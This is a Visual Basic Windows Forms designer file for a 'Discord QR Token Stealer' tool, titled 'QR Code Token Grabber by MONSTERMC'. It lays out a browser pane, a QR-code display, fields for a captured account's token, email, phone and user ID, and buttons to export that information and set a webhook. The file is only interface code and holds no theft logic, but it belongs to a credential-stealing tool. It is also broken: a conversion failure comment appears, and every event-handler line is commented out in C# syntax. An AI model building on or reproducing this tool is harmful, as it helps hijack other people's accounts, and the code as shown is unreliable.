Namespace Discord_QR_Token_Stealer
	Partial Public Class qrGrabber
		''' <summary>
		''' Required designer variable.
		''' </summary>
		Private components As System.ComponentModel.IContainer = Nothing

		''' <summary>
		''' Clean up any resources being used.
		''' </summary>
		''' <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		Protected Overrides Sub Dispose(ByVal disposing As Boolean)
			If disposing AndAlso (components IsNot Nothing) Then
				components.Dispose()
			End If
			MyBase.Dispose(disposing)
		End Sub

		#Region "Windows Form Designer generated code"

		''' <summary>
		''' Required method for Designer support - do not modify
		''' the contents of this method with the code editor.
		''' </summary>
		Private Sub InitializeComponent()
			Dim resources As New System.ComponentModel.ComponentResourceManager(GetType(qrGrabber))
			Me.chromiumWebBrowser1 = New CefSharp.WinForms.ChromiumWebBrowser()
			Me.logBox = New System.Windows.Forms.ListBox()
			Me.exportInfo = New System.Windows.Forms.Button()
			Me.lblToken = New System.Windows.Forms.Label()
			Me.lblTag = New System.Windows.Forms.Label()
			Me.lblEmail = New System.Windows.Forms.Label()
			Me.lblPhone = New System.Windows.Forms.Label()
			Me.lblId = New System.Windows.Forms.Label()
			Me.lblTimeLeft = New System.Windows.Forms.Label()
			Me.reloadPage = New System.Windows.Forms.Button()
			Me.info = New System.Windows.Forms.Button()
			Me.currentCode = New System.Windows.Forms.PictureBox()
			Me.setHook = New System.Windows.Forms.Button()
			DirectCast(Me.currentCode, System.ComponentModel.ISupportInitialize).BeginInit()
			Me.SuspendLayout()
			' 
			' chromiumWebBrowser1
			' 
			Me.chromiumWebBrowser1.ActivateBrowserOnCreation = False
			Me.chromiumWebBrowser1.Anchor = (CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) Or System.Windows.Forms.AnchorStyles.Left) Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles))
' TODO: Code generation for '' failed because of Exception 'Invalid Primitive Type: System.IntPtr. Consider using CodeObjectCreateExpression.'.
			Me.chromiumWebBrowser1.Location = New System.Drawing.Point(347, 12)
			Me.chromiumWebBrowser1.Name = "chromiumWebBrowser1"
			Me.chromiumWebBrowser1.Size = New System.Drawing.Size(1251, 666)
			Me.chromiumWebBrowser1.TabIndex = 1
'			Me.chromiumWebBrowser1.AddressChanged += New System.EventHandler(Of CefSharp.AddressChangedEventArgs)(Me.chromiumWebBrowser1_AddressChanged)
'			Me.chromiumWebBrowser1.IsBrowserInitializedChanged += New System.EventHandler(Me.chromiumWebBrowser1_IsBrowserInitializedChanged)
			' 
			' logBox
			' 
			Me.logBox.Anchor = (CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles))
			Me.logBox.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(40)))), (CInt((CByte(40)))), (CInt((CByte(40)))))
			Me.logBox.ForeColor = System.Drawing.Color.LightGray
			Me.logBox.FormattingEnabled = True
			Me.logBox.Location = New System.Drawing.Point(347, 684)
			Me.logBox.Name = "logBox"
			Me.logBox.Size = New System.Drawing.Size(1251, 121)
			Me.logBox.TabIndex = 2
			' 
			' exportInfo
			' 
			Me.exportInfo.Anchor = (CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles))
			Me.exportInfo.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(40)))), (CInt((CByte(40)))), (CInt((CByte(40)))))
			Me.exportInfo.FlatStyle = System.Windows.Forms.FlatStyle.Popup
			Me.exportInfo.ForeColor = System.Drawing.Color.LightGray
			Me.exportInfo.Location = New System.Drawing.Point(12, 781)
			Me.exportInfo.Name = "exportInfo"
			Me.exportInfo.Size = New System.Drawing.Size(329, 23)
			Me.exportInfo.TabIndex = 4
			Me.exportInfo.Text = "Export account information"
			Me.exportInfo.UseVisualStyleBackColor = False
'			Me.exportInfo.Click += New System.EventHandler(Me.exportInfo_Click)
			' 
			' lblToken
			' 
			Me.lblToken.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.lblToken.Cursor = System.Windows.Forms.Cursors.Hand
			Me.lblToken.ForeColor = System.Drawing.Color.LightGray
			Me.lblToken.Location = New System.Drawing.Point(12, 599)
			Me.lblToken.Name = "lblToken"
			Me.lblToken.Size = New System.Drawing.Size(329, 17)
			Me.lblToken.TabIndex = 5
			Me.lblToken.Text = "Token"
			Me.lblToken.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
'			Me.lblToken.Click += New System.EventHandler(Me.copyControlText_Click)
			' 
			' lblTag
			' 
			Me.lblTag.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.lblTag.Cursor = System.Windows.Forms.Cursors.Hand
			Me.lblTag.ForeColor = System.Drawing.Color.LightGray
			Me.lblTag.Location = New System.Drawing.Point(12, 633)
			Me.lblTag.Name = "lblTag"
			Me.lblTag.Size = New System.Drawing.Size(329, 17)
			Me.lblTag.TabIndex = 6
			Me.lblTag.Text = "Tag"
			Me.lblTag.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
'			Me.lblTag.Click += New System.EventHandler(Me.copyControlText_Click)
			' 
			' lblEmail
			' 
			Me.lblEmail.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.lblEmail.Cursor = System.Windows.Forms.Cursors.Hand
			Me.lblEmail.ForeColor = System.Drawing.Color.LightGray
			Me.lblEmail.Location = New System.Drawing.Point(12, 650)
			Me.lblEmail.Name = "lblEmail"
			Me.lblEmail.Size = New System.Drawing.Size(329, 17)
			Me.lblEmail.TabIndex = 7
			Me.lblEmail.Text = "Email"
			Me.lblEmail.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
'			Me.lblEmail.Click += New System.EventHandler(Me.copyControlText_Click)
			' 
			' lblPhone
			' 
			Me.lblPhone.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.lblPhone.Cursor = System.Windows.Forms.Cursors.Hand
			Me.lblPhone.ForeColor = System.Drawing.Color.LightGray
			Me.lblPhone.Location = New System.Drawing.Point(12, 667)
			Me.lblPhone.Name = "lblPhone"
			Me.lblPhone.Size = New System.Drawing.Size(329, 17)
			Me.lblPhone.TabIndex = 8
			Me.lblPhone.Text = "Phone"
			Me.lblPhone.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
'			Me.lblPhone.Click += New System.EventHandler(Me.copyControlText_Click)
			' 
			' lblId
			' 
			Me.lblId.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.lblId.Cursor = System.Windows.Forms.Cursors.Hand
			Me.lblId.ForeColor = System.Drawing.Color.LightGray
			Me.lblId.Location = New System.Drawing.Point(12, 616)
			Me.lblId.Name = "lblId"
			Me.lblId.Size = New System.Drawing.Size(329, 17)
			Me.lblId.TabIndex = 9
			Me.lblId.Text = "User ID"
			Me.lblId.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
'			Me.lblId.Click += New System.EventHandler(Me.copyControlText_Click)
			' 
			' lblTimeLeft
			' 
			Me.lblTimeLeft.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.lblTimeLeft.ForeColor = System.Drawing.Color.LightGray
			Me.lblTimeLeft.Location = New System.Drawing.Point(12, 32)
			Me.lblTimeLeft.Name = "lblTimeLeft"
			Me.lblTimeLeft.Size = New System.Drawing.Size(329, 23)
			Me.lblTimeLeft.TabIndex = 10
			Me.lblTimeLeft.Text = "Time left"
			Me.lblTimeLeft.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
			' 
			' reloadPage
			' 
			Me.reloadPage.Anchor = (CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles))
			Me.reloadPage.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(40)))), (CInt((CByte(40)))), (CInt((CByte(40)))))
			Me.reloadPage.FlatStyle = System.Windows.Forms.FlatStyle.Popup
			Me.reloadPage.ForeColor = System.Drawing.Color.LightGray
			Me.reloadPage.Location = New System.Drawing.Point(12, 752)
			Me.reloadPage.Name = "reloadPage"
			Me.reloadPage.Size = New System.Drawing.Size(160, 23)
			Me.reloadPage.TabIndex = 11
			Me.reloadPage.Text = "Reload page"
			Me.reloadPage.UseVisualStyleBackColor = False
'			Me.reloadPage.Click += New System.EventHandler(Me.reloadPage_Click)
			' 
			' info
			' 
			Me.info.Anchor = (CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles))
			Me.info.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(40)))), (CInt((CByte(40)))), (CInt((CByte(40)))))
			Me.info.FlatStyle = System.Windows.Forms.FlatStyle.Popup
			Me.info.ForeColor = System.Drawing.Color.LightGray
			Me.info.Location = New System.Drawing.Point(181, 752)
			Me.info.Name = "info"
			Me.info.Size = New System.Drawing.Size(160, 23)
			Me.info.TabIndex = 12
			Me.info.Text = "Information"
			Me.info.UseVisualStyleBackColor = False
'			Me.info.Click += New System.EventHandler(Me.info_Click)
			' 
			' currentCode
			' 
			Me.currentCode.Anchor = System.Windows.Forms.AnchorStyles.Left
			Me.currentCode.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(40)))), (CInt((CByte(40)))), (CInt((CByte(40)))))
			Me.currentCode.Location = New System.Drawing.Point(12, 58)
			Me.currentCode.Name = "currentCode"
			Me.currentCode.Size = New System.Drawing.Size(329, 497)
			Me.currentCode.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
			Me.currentCode.TabIndex = 3
			Me.currentCode.TabStop = False
'			Me.currentCode.Click += New System.EventHandler(Me.currentCode_Click)
			' 
			' setHook
			' 
			Me.setHook.Anchor = (CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles))
			Me.setHook.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(40)))), (CInt((CByte(40)))), (CInt((CByte(40)))))
			Me.setHook.FlatStyle = System.Windows.Forms.FlatStyle.Popup
			Me.setHook.ForeColor = System.Drawing.Color.LightGray
			Me.setHook.Location = New System.Drawing.Point(12, 723)
			Me.setHook.Name = "setHook"
			Me.setHook.Size = New System.Drawing.Size(329, 23)
			Me.setHook.TabIndex = 13
			Me.setHook.Text = "Set webhook"
			Me.setHook.UseVisualStyleBackColor = False
'			Me.setHook.Click += New System.EventHandler(Me.setHook_Click)
			' 
			' qrGrabber
			' 
			Me.AutoScaleDimensions = New System.Drawing.SizeF(6F, 13F)
			Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
			Me.BackColor = System.Drawing.Color.FromArgb((CInt((CByte(20)))), (CInt((CByte(20)))), (CInt((CByte(20)))))
			Me.ClientSize = New System.Drawing.Size(1610, 816)
			Me.Controls.Add(Me.setHook)
			Me.Controls.Add(Me.info)
			Me.Controls.Add(Me.reloadPage)
			Me.Controls.Add(Me.lblTimeLeft)
			Me.Controls.Add(Me.lblId)
			Me.Controls.Add(Me.lblPhone)
			Me.Controls.Add(Me.lblEmail)
			Me.Controls.Add(Me.lblTag)
			Me.Controls.Add(Me.lblToken)
			Me.Controls.Add(Me.exportInfo)
			Me.Controls.Add(Me.currentCode)
			Me.Controls.Add(Me.logBox)
			Me.Controls.Add(Me.chromiumWebBrowser1)
			Me.Icon = (DirectCast(resources.GetObject("$this.Icon"), System.Drawing.Icon))
			Me.Name = "qrGrabber"
			Me.Text = "QR Code Token Grabber by MONSTERMC"
'			Me.FormClosing += New System.Windows.Forms.FormClosingEventHandler(Me.qrGrabber_FormClosing)
'			Me.Load += New System.EventHandler(Me.qrGrabber_Load)
			DirectCast(Me.currentCode, System.ComponentModel.ISupportInitialize).EndInit()
			Me.ResumeLayout(False)

		End Sub

		#End Region
		Private WithEvents chromiumWebBrowser1 As CefSharp.WinForms.ChromiumWebBrowser
		Private logBox As System.Windows.Forms.ListBox
		Private WithEvents currentCode As System.Windows.Forms.PictureBox
		Private WithEvents exportInfo As System.Windows.Forms.Button
		Private WithEvents lblToken As System.Windows.Forms.Label
		Private WithEvents lblTag As System.Windows.Forms.Label
		Private WithEvents lblEmail As System.Windows.Forms.Label
		Private WithEvents lblPhone As System.Windows.Forms.Label
		Private WithEvents lblId As System.Windows.Forms.Label
		Private lblTimeLeft As System.Windows.Forms.Label
		Private WithEvents reloadPage As System.Windows.Forms.Button
		Private WithEvents info As System.Windows.Forms.Button
		Private WithEvents setHook As System.Windows.Forms.Button
	End Class
End Namespace

